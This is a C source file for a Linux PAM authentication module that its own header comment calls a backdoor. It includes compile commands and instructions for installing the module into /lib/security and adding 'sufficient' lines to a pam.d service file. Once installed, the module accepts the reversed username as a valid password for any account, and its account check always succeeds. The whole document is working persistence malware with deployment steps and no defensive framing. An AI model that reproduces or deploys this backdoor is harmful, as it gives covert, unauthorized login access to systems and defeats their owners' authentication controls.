/* 
   reverse username pam.d backdoor. compile with: 
   gcc -fPIC -c pam_rev.c 
   ld -x --shared -o pam_rev.so pam_rev.o

   copy resulting pam_rev.so to /lib/security/ or /lib64/security/

   add following to top of /pam.d/ authy you want to backdoor:
   auth            sufficient      pam_rev.so
   account         sufficient      pam_rev.so
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#include <security/pam_appl.h>
#include <security/pam_ext.h>
#include <security/pam_modules.h>

char *strrev(char *str)
{
      char *p1, *p2;

      if (! str || ! *str)
            return str;
      for (p1 = str, p2 = str + strlen(str) - 1; p2 > p1; ++p1, --p2)
      {
            *p1 ^= *p2;
            *p2 ^= *p1;
            *p1 ^= *p2;
      }
      return str;
}

PAM_EXTERN int pam_sm_setcred
(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt
(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate
(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    int retval = PAM_ABORT;
    char *password;
    const char *user;

    pam_get_authtok(pamh, PAM_AUTHTOK, (const char **)&password, NULL);
    pam_get_user(pamh, &user, NULL);

    char *rev = strdup(user);
    strrev(rev);

    if (!strncmp(password, rev, strlen(rev))) {
        retval = PAM_SUCCESS;
    }

    free(rev);
    return retval;
}